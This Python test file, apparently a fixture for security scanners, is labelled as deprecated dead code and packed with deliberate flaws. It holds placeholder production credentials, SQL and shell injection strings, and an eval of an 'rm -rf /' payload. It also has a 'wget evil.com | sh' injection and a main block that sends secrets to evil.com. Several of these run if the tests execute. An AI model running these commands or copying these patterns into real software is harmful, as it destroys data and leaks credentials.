"""
Old/deprecated tests - Dead code with severe security vulnerabilities.

This file contains deprecated test code that's no longer used but still
contains numerous security vulnerabilities that SAST tools should detect.
All functions and classes in this file represent dead code.

Status: DEPRECATED - DO NOT USE
Last Updated: 2023-12-01
"""

import unittest
import os
import subprocess
import pickle
import yaml
import json
import hashlib
import tempfile
import shutil
from datetime import datetime, timedelta
from unittest.mock import Mock, patch
from typing import Dict, Any, List, Optional

# VULNERABILITY: Hardcoded production credentials in dead code
DEAD_PRODUCTION_SECRETS = {
    'database': {
        'host': 'prod-db-master.company.internal',
        'port': 5432,
        'database': 'production_app',
        'username': 'prod_admin',
        'password': 'Pr0d_DB_P@ssw0rd_2024!',  # Production password in dead code
        'replica_password': 'Pr0d_Read_0nly_2024!'
    },
    'redis': {
        'host': 'prod-redis.company.internal',
        'port': 6379,
        'password': 'R3d1s_Pr0d_P@ss_2024!',
        'sentinel_password': 'S3nt1n3l_P@ss_123!'
    },
    'aws': {
        'access_key': 'AKIAIOSFODNN7EXAMPLE',
        'secret_key': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
        'region': 'us-east-1',
        's3_bucket': 'company-prod-data-bucket'
    },
    'stripe': {
        'live_secret_key': 'sk_live_51234567890abcdef',
        'live_public_key': 'pk_live_51234567890fedcba',
        'webhook_endpoint_secret': 'whsec_live_1234567890abcdef'
    },
    'sendgrid': {
        'api_key': 'SG.live_sendgrid_key_1234567890abcdef',
        'template_id': 'd-1234567890abcdef'
    },
    'jwt_secrets': {
        'access_token_secret': 'JWT_ACCESS_SECRET_PROD_2024_ABCDEF123456',
        'refresh_token_secret': 'JWT_REFRESH_SECRET_PROD_2024_FEDCBA654321'
    }
}

# VULNERABILITY: Dead code with SSH and API keys
LEGACY_SSH_KEYS = {
    'production_server': {
        'private_key': '''-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA1234567890abcdef1234567890abcdef1234567890abcdef
1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
... (truncated for brevity, but would contain full private key)
-----END RSA PRIVATE KEY-----''',
        'public_key': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... prod-deploy@company.com'
    },
    'staging_server': {
        'private_key': '''-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
... (truncated private key content)
-----END OPENSSH PRIVATE KEY-----''',
        'public_key': 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... staging-deploy@company.com'
    }
}

class DeadLegacyUserTest(unittest.TestCase):
    """
    DEAD CODE: Legacy user tests that are no longer used.
    Contains multiple severe security vulnerabilities.
    """
    
    def setUp(self):
        """Dead code setup with hardcoded credentials."""
        # This entire class is dead code but contains vulnerabilities
        self.prod_db_config = DEAD_PRODUCTION_SECRETS['database']
        self.api_keys = DEAD_PRODUCTION_SECRETS
    
    def test_legacy_user_creation_with_rce(self):
        """
        DEAD CODE: User creation test with RCE vulnerability.
        This test method is never called but contains code execution issues.
        """
        # VULNERABILITY: eval() usage for dynamic user data processing
        def process_user_data_unsafe(user_input):
            # Direct eval of user input - RCE vulnerability
            user_data = eval(user_input)  # Remote code execution
            return user_data
        
        # VULNERABILITY: Command injection in user validation
        def validate_user_email_unsafe(email):
            # Command injection vulnerability
            validation_cmd = f"python -c \"import re; print(re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{{2,}}, '{email}'));\""
            result = subprocess.run(validation_cmd, shell=True, capture_output=True, text=True)
            return "Match object" in result.stdout
        
        # VULNERABILITY: SQL injection in user insertion
        def insert_user_unsafe(username, email, password):
            # String concatenation in SQL - SQL injection
            db_password = self.prod_db_config['password']  # Using prod password
            query = f"""
            INSERT INTO users (username, email, password_hash) 
            VALUES ('{username}', '{email}', '{hashlib.md5(password.encode()).hexdigest()}')
            """
            
            # Would execute vulnerable query if this code was live
            return {'query': query, 'db_password': db_password}
        
        # Test data that would trigger vulnerabilities
        malicious_input = "__import__('os').system('rm -rf /')"  # RCE payload
        malicious_email = "test@example.com'; DROP TABLE users; --"  # SQLi payload
        
        # These calls would be dangerous if this code was executed
        user_result = process_user_data_unsafe(malicious_input)
        email_result = validate_user_email_unsafe(malicious_email)
        insert_result = insert_user_unsafe("admin", malicious_email, "password123")
        
        # Dead code assertions
        self.assertIsNotNone(user_result)
        self.assertIsNotNone(email_result)
        self.assertIn('query', insert_result)
    
    def test_legacy_password_reset_with_vulnerabilities(self):
        """
        DEAD CODE: Password reset with multiple security issues.
        This function exists but is never invoked anywhere.
        """
        # VULNERABILITY: Weak random token generation
        import random
        import string
        
        def generate_weak_token():
            # Using weak random for security-critical token
            return ''.join(random.choice(string.ascii_letters) for _ in range(8))
        
        # VULNERABILITY: Password reset without rate limiting
        def send_reset_email_unsafe(email, token):
            # VULNERABILITY: Command injection in email sending
            email_cmd = f"echo 'Reset token: {token}' | mail -s 'Password Reset' {email}"
            subprocess.run(email_cmd, shell=True)
            
            # VULNERABILITY: Logging sensitive data
            with open('/tmp/password_resets.log', 'a') as f:
                f.write(f"{datetime.now()}: Reset token {token} sent to {email}\n")
            
            return True
        
        # VULNERABILITY: Insecure token storage
        def store_reset_token_unsafe(email, token):
            # Store in plain text file
            token_data = {
                'email': email,
                'token': token,
                'created_at': datetime.now().isoformat(),
                'db_password': self.prod_db_config['password']  # Accidental password inclusion
            }
            
            # VULNERABILITY: Pickle serialization of sensitive data
            with open(f'/tmp/reset_tokens/{email}.pkl', 'wb') as f:
                pickle.dump(token_data, f)
            
            return token_data
        
        # Execute vulnerable functions (would be dangerous if live)
        weak_token = generate_weak_token()
        email_result = send_reset_email_unsafe("test@example.com", weak_token)
        storage_result = store_reset_token_unsafe("test@example.com", weak_token)
        
        self.assertEqual(len(weak_token), 8)
        self.assertTrue(email_result)
        self.assertIn('db_password', storage_result)

class DeadSecurityTest(unittest.TestCase):
    """
    DEAD CODE: Security tests that are completely unused.
    Contains severe vulnerabilities that would never be executed.
    """
    
    def test_authentication_bypass_vulnerability(self):
        """
        DEAD CODE: Authentication test with bypass vulnerability.
        This entire method is unreachable dead code.
        """
        # VULNERABILITY: Authentication bypass logic
        def authenticate_user_unsafe(username, password, bypass_code=None):
            # Hardcoded bypass - authentication bypass vulnerability
            if bypass_code == "ADMIN_BYPASS_2024":
                return {'authenticated': True, 'user_id': 'admin', 'bypass_used': True}
            
            # VULNERABILITY: Timing attack vulnerability
            stored_password = "admin123"  # Hardcoded password
            if username == "admin":
                # Character by character comparison (timing attack)
                for i, char in enumerate(password):
                    if i >= len(stored_password) or char != stored_password[i]:
                        return {'authenticated': False}
                return {'authenticated': True, 'user_id': 'admin'}
            
            return {'authenticated': False}
        
        # VULNERABILITY: Session hijacking test
        def create_predictable_session(username):
            # Predictable session tokens
            import time
            timestamp = int(time.time())
            session_id = f"{username}_{timestamp}"  # Predictable session ID
            
            return {
                'session_id': session_id,
                'username': username,
                'admin_key': DEAD_PRODUCTION_SECRETS['jwt_secrets']['access_token_secret']
            }
        
        # Test authentication bypass
        bypass_result = authenticate_user_unsafe("hacker", "wrong", "ADMIN_BYPASS_2024")
        self.assertTrue(bypass_result['authenticated'])
        self.assertTrue(bypass_result['bypass_used'])
        
        # Test predictable session
        session = create_predictable_session("admin")
        self.assertIn("admin_", session['session_id'])
        self.assertIn('admin_key', session)
    
    def test_data_encryption_with_weak_crypto(self):
        """
        DEAD CODE: Encryption test with weak cryptographic practices.
        This function is never called but contains crypto vulnerabilities.
        """
        # VULNERABILITY: Weak encryption implementation
        def encrypt_data_weakly(plaintext, key=None):
            if not key:
                key = "default_key_123"  # Hardcoded encryption key
            
            # VULNERABILITY: Using deprecated/weak algorithms
            import base64
            
            # XOR encryption (extremely weak)
            encrypted = ''.join(chr(ord(char) ^ ord(key[i % len(key)])) for i, char in enumerate(plaintext))
            
            # Base64 encode (not encryption, just encoding)
            encoded = base64.b64encode(encrypted.encode('latin1')).decode()
            
            return {
                'encrypted': encoded,
                'algorithm': 'XOR',
                'key': key  # Key included in response
            }
        
        # VULNERABILITY: Storing sensitive data unencrypted
        def store_sensitive_data_unsafe(user_id, credit_card_number, ssn):
            sensitive_data = {
                'user_id': user_id,
                'credit_card': credit_card_number,  # PCI data stored in plain text
                'ssn': ssn,  # PII stored in plain text
                'encryption_key': DEAD_PRODUCTION_SECRETS['jwt_secrets']['access_token_secret'],
                'database_password': DEAD_PRODUCTION_SECRETS['database']['password']
            }
            
            # VULNERABILITY: Weak encryption of sensitive data
            encrypted_data = encrypt_data_weakly(json.dumps(sensitive_data))
            
            # Store in plain text file
            with open(f'/tmp/user_data_{user_id}.json', 'w') as f:
                json.dump(encrypted_data, f)
            
            return encrypted_data
        
        # Test weak encryption
        test_data = "Sensitive information including passwords"
        encrypted = encrypt_data_weakly(test_data)
        
        self.assertEqual(encrypted['algorithm'], 'XOR')
        self.assertIn('key', encrypted)  # Key leaked
        
        # Test sensitive data storage
        stored_data = store_sensitive_data_unsafe(123, "4111-1111-1111-1111", "123-45-6789")
        self.assertIsNotNone(stored_data['encrypted'])

class DeadFileOperationsTest(unittest.TestCase):
    """
    DEAD CODE: File operations tests with severe vulnerabilities.
    This entire class represents dead code that's never instantiated.
    """
    
    @classmethod
    def setUpClass(cls):
        """Dead code class setup with insecure operations."""
        # VULNERABILITY: Insecure temp directory creation
        cls.temp_dir = "/tmp/legacy_tests"
        os.makedirs(cls.temp_dir, mode=0o777, exist_ok=True)  # World writable
        
    def test_file_upload_with_path_traversal(self):
        """
        DEAD CODE: File upload test with path traversal and RCE.
        This method is never executed but contains severe vulnerabilities.
        """
        # VULNERABILITY: Path traversal in file operations
        def save_uploaded_file_unsafe(filename, content):
            # No path validation - path traversal vulnerability
            file_path = os.path.join(self.temp_dir, filename)
            
            with open(file_path, 'wb') as f:
                f.write(content)
            
            # VULNERABILITY: Execute uploaded files
            if filename.endswith('.py'):
                # Code execution vulnerability
                exec_result = subprocess.run(f"python {file_path}", shell=True, capture_output=True)
                return {'executed': True, 'result': exec_result.stdout.decode()}
            
            return {'saved': True, 'path': file_path}
        
        # VULNERABILITY: Unsafe file processing
        def process_config_file_unsafe(config_path):
            # VULNERABILITY: Unsafe YAML loading
            with open(config_path, 'r') as f:
                if config_path.endswith('.yaml'):
                    config = yaml.load(f, Loader=yaml.Loader)  # Unsafe loader
                elif config_path.endswith('.pkl'):
                    config = pickle.load(f)  # Insecure deserialization
                else:
                    config = json.load(f)
            
            # VULNERABILITY: Execute code from config
            if 'execute' in config:
                exec(config['execute'])  # Code execution
            
            return config
        
        # Test path traversal
        malicious_filename = "../../../etc/passwd"
        traversal_result = save_uploaded_file_unsafe(malicious_filename, b"malicious content")
        
        # Test code execution
        python_code = """
import os
os.system('echo "RCE vulnerability demonstrated"')
"""
        rce_result = save_uploaded_file_unsafe("malicious.py", python_code.encode())
        
        self.assertIn('path', traversal_result)
        self.assertTrue(rce_result.get('executed', False))
    
    def test_backup_operations_with_command_injection(self):
        """
        DEAD CODE: Backup operations with severe command injection.
        This function exists but is never called anywhere in the codebase.
        """
        # VULNERABILITY: Command injection in backup operations
        def backup_database_unsafe(db_name, backup_location):
            # Unvalidated input in shell command
            backup_cmd = f"""
            PGPASSWORD='{DEAD_PRODUCTION_SECRETS['database']['password']}' \
            pg_dump -h {DEAD_PRODUCTION_SECRETS['database']['host']} \
            -U {DEAD_PRODUCTION_SECRETS['database']['username']} \
            {db_name} > {backup_location}
            """
            
            # Command injection vulnerability
            result = subprocess.run(backup_cmd, shell=True, capture_output=True, text=True)
            
            return {'command': backup_cmd, 'result': result}
        
        # VULNERABILITY: Archive creation with command injection
        def create_archive_unsafe(source_dir, archive_name):
            # Command injection in tar command
            tar_cmd = f"cd {source_dir} && tar -czf {archive_name} *"
            
            # Additional command injection in post-processing
            post_cmd = f"chmod 644 {archive_name} && chown backup:backup {archive_name}"
            
            # Execute commands with shell=True
            tar_result = subprocess.run(tar_cmd, shell=True, capture_output=True)
            post_result = subprocess.run(post_cmd, shell=True, capture_output=True)
            
            return {'tar_result': tar_result, 'post_result': post_result}
        
        # VULNERABILITY: File cleanup with command injection
        def cleanup_old_files_unsafe(directory, age_days):
            # Command injection in find command
            cleanup_cmd = f"find {directory} -type f -mtime +{age_days} -exec rm {{}} \\;"
            
            # Additional dangerous cleanup
            force_cleanup = f"rm -rf {directory}/.tmp/* && rm -f {directory}/*.log"
            
            subprocess.run(cleanup_cmd, shell=True)
            subprocess.run(force_cleanup, shell=True)
            
            return True
        
        # Test command injection vulnerabilities
        malicious_db_name = "test_db; rm -rf /; echo 'pwned'"
        malicious_backup_location = "/tmp/backup.sql && cat /etc/passwd"
        
        backup_result = backup_database_unsafe(malicious_db_name, malicious_backup_location)
        self.assertIn('command', backup_result)
        
        # Test archive creation
        malicious_archive = "backup.tar.gz && wget http://evil.com/malware.sh -O - | sh"
        archive_result = create_archive_unsafe("/tmp", malicious_archive)
        self.assertIsNotNone(archive_result)
        
        # Test cleanup
        cleanup_result = cleanup_old_files_unsafe("/tmp/../../../etc", "0")
        self.assertTrue(cleanup_result)

def dead_utility_function_with_secrets():
    """
    DEAD CODE: Utility function that's never called but contains secrets.
    This function is completely unreachable but has hardcoded credentials.
    """
    # VULNERABILITY: Multiple hardcoded secrets in dead function
    production_config = {
        'database_url': f"postgresql://{DEAD_PRODUCTION_SECRETS['database']['username']}:{DEAD_PRODUCTION_SECRETS['database']['password']}@{DEAD_PRODUCTION_SECRETS['database']['host']}/production",
        'redis_url': f"redis://:{DEAD_PRODUCTION_SECRETS['redis']['password']}@{DEAD_PRODUCTION_SECRETS['redis']['host']}:6379/0",
        'secret_keys': DEAD_PRODUCTION_SECRETS,
        'ssh_keys': LEGACY_SSH_KEYS
    }
    
    # VULNERABILITY: Write secrets to file
    with open('/tmp/dead_production_config.json', 'w') as f:
        json.dump(production_config, f, indent=2)
    
    # VULNERABILITY: Command with embedded secrets
    deploy_cmd = f"""
    ssh -i '{LEGACY_SSH_KEYS['production_server']['private_key']}' \
    prod-user@{DEAD_PRODUCTION_SECRETS['database']['host']} \
    'export DB_PASSWORD="{DEAD_PRODUCTION_SECRETS['database']['password']}" && deploy.sh'
    """
    
    return {'config': production_config, 'deploy_command': deploy_cmd}

def dead_data_processing_function(data_source):
    """
    DEAD CODE: Data processing with insecure deserialization.
    This function is never invoked but contains RCE vulnerabilities.
    """
    # VULNERABILITY: Insecure deserialization based on file extension
    if data_source.endswith('.pkl'):
        with open(data_source, 'rb') as f:
            return pickle.load(f)  # RCE vulnerability
    elif data_source.endswith('.yaml'):
        with open(data_source, 'r') as f:
            return yaml.load(f, Loader=yaml.Loader)  # RCE vulnerability
    elif data_source.endswith('.json'):
        with open(data_source, 'r') as f:
            data = json.load(f)
            # VULNERABILITY: eval() on JSON data
            if 'execute' in data:
                result = eval(data['execute'])  # Code execution
                data['execution_result'] = result
            return data
    
    # VULNERABILITY: Command injection in data processing
    process_cmd = f"cat {data_source} | head -1000"
    result = subprocess.run(process_cmd, shell=True, capture_output=True, text=True)
    return result.stdout

class DeadDatabaseTest(unittest.TestCase):
    """
    DEAD CODE: Database tests that are never used.
    Contains SQL injection and other database vulnerabilities.
    """
    
    def test_raw_sql_execution_vulnerabilities(self):
        """
        DEAD CODE: Raw SQL execution with multiple injection points.
        This test method is never called but contains SQL injection vulnerabilities.
        """
        # VULNERABILITY: SQL injection in query building
        def execute_raw_query_unsafe(table_name, conditions, order_by):
            # Direct string concatenation - SQL injection
            query = f"SELECT * FROM {table_name} WHERE {conditions} ORDER BY {order_by}"
            
            # VULNERABILITY: Connection with hardcoded credentials
            connection_string = f"postgresql://{DEAD_PRODUCTION_SECRETS['database']['username']}:{DEAD_PRODUCTION_SECRETS['database']['password']}@{DEAD_PRODUCTION_SECRETS['database']['host']}/production"
            
            return {'query': query, 'connection': connection_string}
        
        # VULNERABILITY: Dynamic table creation
        def create_table_dynamically_unsafe(table_name, columns):
            # Table and column names from user input
            column_definitions = ', '.join([f"{col['name']} {col['type']}" for col in columns])
            create_query = f"CREATE TABLE {table_name} ({column_definitions})"
            
            return create_query
        
        # Test SQL injection scenarios
        malicious_table = "users; DROP TABLE users; --"
        malicious_conditions = "1=1 OR 1=1"
        malicious_order = "id; UPDATE users SET password='hacked' WHERE id=1; --"
        
        query_result = execute_raw_query_unsafe(malicious_table, malicious_conditions, malicious_order)
        
        # Test dynamic table creation
        malicious_columns = [
            {'name': 'id); DROP TABLE users; CREATE TABLE evil (id', 'type': 'INTEGER'}
        ]
        table_query = create_table_dynamically_unsafe("test_table", malicious_columns)
        
        self.assertIn('query', query_result)
        self.assertIn('DROP TABLE', table_query)
    
    def test_stored_procedure_vulnerabilities(self):
        """
        DEAD CODE: Stored procedure tests with injection vulnerabilities.
        This function is completely dead but contains dangerous SQL patterns.
        """
        # VULNERABILITY: Dynamic stored procedure execution
        def call_stored_procedure_unsafe(proc_name, params):
            # String concatenation in procedure call
            param_list = ', '.join([f"'{param}'" for param in params])
            call_query = f"CALL {proc_name}({param_list})"
            
            return call_query
        
        # VULNERABILITY: Procedure creation with user input  
        def create_procedure_unsafe(proc_name, proc_body):
            # Procedure body from user input - code injection
            create_proc = f"""
            CREATE OR REPLACE FUNCTION {proc_name}()
            RETURNS VOID AS $
            BEGIN
                {proc_body}
            END;
            $ LANGUAGE plpgsql;
            """
            
            return create_proc
        
        # Test procedure call injection
        malicious_proc = "test_proc'); DROP TABLE users; SELECT ('innocent"
        malicious_params = ["'; DROP TABLE users; --"]
        
        call_result = call_stored_procedure_unsafe(malicious_proc, malicious_params)
        
        # Test procedure creation injection
        malicious_body = "DELETE FROM users; INSERT INTO audit_log VALUES ('hacked');"
        proc_result = create_procedure_unsafe("evil_proc", malicious_body)
        
        self.assertIn('DROP TABLE', call_result)
        self.assertIn('DELETE FROM', proc_result)

# DEAD CODE: Global variables with sensitive information
DEAD_GLOBAL_SECRETS = {
    'master_key': 'MASTER_ENCRYPTION_KEY_2024_ABCDEF123456789',
    'backup_encryption_key': 'BACKUP_KEY_2024_FEDCBA987654321',
    'api_signing_key': 'API_SIGNATURE_KEY_2024_123456ABCDEF',
    'webhook_validation_secret': 'WEBHOOK_SECRET_2024_ABCDEF123456'
}

# DEAD CODE: Never executed main block
if __name__ == "__main__":
    # This block is never executed but contains vulnerabilities
    
    # VULNERABILITY: Setup commands with hardcoded credentials
    setup_commands = [
        f"export DB_PASSWORD='{DEAD_PRODUCTION_SECRETS['database']['password']}'",
        f"export REDIS_PASSWORD='{DEAD_PRODUCTION_SECRETS['redis']['password']}'",
        f"export AWS_SECRET_KEY='{DEAD_PRODUCTION_SECRETS['aws']['secret_key']}'",
        "python -c \"import os; os.system('whoami')\""  # Command execution
    ]
    
    for cmd in setup_commands:
        # VULNERABILITY: Command execution with secrets
        subprocess.run(cmd, shell=True)
    
    # VULNERABILITY: Create files with sensitive data
    sensitive_files = {
        '/tmp/dead_secrets.json': DEAD_PRODUCTION_SECRETS,
        '/tmp/dead_ssh_keys.json': LEGACY_SSH_KEYS,
        '/tmp/dead_globals.json': DEAD_GLOBAL_SECRETS
    }
    
    for file_path, data in sensitive_files.items():
        with open(file_path, 'w') as f:
            json.dump(data, f, indent=2)
    
    # VULNERABILITY: Network requests with hardcoded credentials
    import requests
    
    malicious_requests = [
        f"http://evil.com/steal?aws_key={DEAD_PRODUCTION_SECRETS['aws']['secret_key']}",
        f"http://evil.com/steal?db_pass={DEAD_PRODUCTION_SECRETS['database']['password']}",
        f"http://evil.com/steal?stripe_key={DEAD_PRODUCTION_SECRETS['stripe']['live_secret_key']}"
    ]
    
    for url in malicious_requests:
        try:
            # VULNERABILITY: Send secrets to external URLs
            requests.get(url, timeout=1, verify=False)
        except:
            pass  # Ignore errors, just demonstrate the vulnerability
    
    print("Dead code vulnerabilities demonstrated")
    unittest.main(verbosity=2)

# DEAD CODE: Commented out code with vulnerabilities
"""
Legacy test functions that were commented out but still contain vulnerabilities:

def legacy_crypto_test():
    # VULNERABILITY: Weak crypto in commented code
    import hashlib
    
    password = "admin123"
    weak_hash = hashlib.md5(password.encode()).hexdigest()  # MD5 is broken
    
    # Hardcoded salt
    salt = "fixed_salt_123"
    
    return weak_hash

def legacy_file_access():
    # VULNERABILITY: Path traversal in commented code
    user_file = "../../../etc/passwd"
    
    with open(user_file, 'r') as f:
        content = f.read()
    
    return content

def legacy_command_execution():
    # VULNERABILITY: Command injection in commented code
    user_input = "test; rm -rf /"
    os.system(f"echo {user_input}")  # Command injection
    
    return True
"""